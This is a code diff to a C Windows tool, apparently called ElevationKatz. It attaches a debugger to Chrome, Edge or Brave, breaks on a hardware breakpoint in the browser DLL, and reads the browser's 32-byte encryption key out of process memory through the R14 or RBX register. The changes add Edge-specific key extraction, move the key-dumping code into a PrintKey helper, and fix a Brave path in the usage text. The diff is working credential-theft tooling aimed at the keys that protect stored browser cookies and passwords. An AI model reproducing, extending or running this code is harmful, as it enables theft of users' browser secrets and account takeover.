@@ -347,7 +347,30 @@ uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, 
     return 0;
 }
 
-void DumpSecret(HANDLE hProc, HANDLE hThread) {
+void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
+    SIZE_T n = 0;
+    uintptr_t address = 0;
+    if (!ReadProcessMemory(hProc, (LPCVOID)registryAddr, &address, sizeof(uintptr_t), &n)) {
+        printf("[-] Failed to read contents of R14, Error: %lu\n", GetLastError());
+        return;
+    }
+    printf("[*] Encryption key will be at 0x%016llx\n", (unsigned long long)address);
+
+    n = 0;
+    const int keyLen = 32;
+    BYTE key[keyLen] = { 0 };
+    if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
+        printf("[-] Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
+        return;
+    }
+
+    printf("[+] Got key: ");
+    for (size_t i = 0; i < keyLen; i++)
+        printf("%02X", key[i]);
+    printf("\n");
+}
+
+void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;
 
@@ -371,26 +394,20 @@ void DumpSecret(HANDLE hProc, HANDLE hThread) {
         return;
     }
 
-    SIZE_T n = 0;
-    uintptr_t address = 0;
-    if (!ReadProcessMemory(hProc, (LPCVOID)ctx.R14, &address, sizeof(uintptr_t), &n)) {
-        printf("[-] Failed to read contents of R14, Error: %lu\n", GetLastError());
-        return;
-    }
-    printf("[*] Encryption key will be at 0x%016llx\n", (unsigned long long)address);
-
-    n = 0;
-    const int keyLen = 32;
-    BYTE key[keyLen] = { 0 };
-    if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
-        printf("[-] Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
+    if (edge && ctx.Rbx == 0)
+    {
+        printf("[-] RBX registry was empty\n");
         return;
     }
 
-    printf("[+] Got key: ");
-    for (size_t i = 0; i < keyLen; i++)
-        printf("%02X", key[i]);
-    printf("\n");
+    if (edge)
+    {
+        printf("[*] Dumping key from RBX\n");
+        PrintKey(hProc, ctx.Rbx);
+    } else {
+        printf("[*] Dumping key from R14\n");
+        PrintKey(hProc, ctx.R14);
+    }
 }
 
 BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {
@@ -460,7 +477,11 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     GetThreadContext(hThread, &c);
 
                     printf("[+] Hit HW breakpoint Execute at slot 0: RIP=0x%016llx\n", (unsigned long long)c.Rip);
-                    DumpSecret(hProcess, hThread);
+
+                    if (_wcsicmp(targetModule, L"msedge.dll") == 0)
+                        DumpSecret(hProcess, hThread, TRUE);
+                    else
+                        DumpSecret(hProcess, hThread, FALSE);
 
                     CloseHandle(hThread);
 
@@ -477,8 +498,12 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     if (hThread) {
                         DWORD exitCode;
                         if (GetExitCodeThread(hThread, &exitCode)) {
-                            if (exitCode == STILL_ACTIVE)
-                                DumpSecret(hProcess, hThread);
+                            if (exitCode == STILL_ACTIVE) {
+                                if (_wcsicmp(targetModule, L"msedge.dll") == 0)
+                                    DumpSecret(hProcess, hThread, TRUE);
+                                else
+                                    DumpSecret(hProcess, hThread, FALSE);
+                            }
                             else
                                 printf("[-] Thread %d has already exited. Exit code: %d\n", debugEvent.dwThreadId, exitCode);
                         }
@@ -627,7 +652,7 @@ void usage() {
     printf(".\\ElevationKatz.exe /edge /wait:1000\n");
     printf("    Starts a new chrome process using path: C:\\Program Files(x86)\\Microsoft\\Edge\\Application\\msedge.exe\n");
     printf("    Waits for 1000 milliseconds for process to finish until forced shutdown.\n");
-    printf(".\\ElevationKatz.exe /path:\"C:\\Program Files\\BraveSoftware\\Brave - Browser\\Application\\brave.exe\" /module:chrome.dll\n");
+    printf(".\\ElevationKatz.exe /path:\"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe\" /module:chrome.dll\n");
     printf("    Targets the Brave browser\n");
     printf("Flags:\n");
     printf("    /chrome                Target Chrome process.\n");
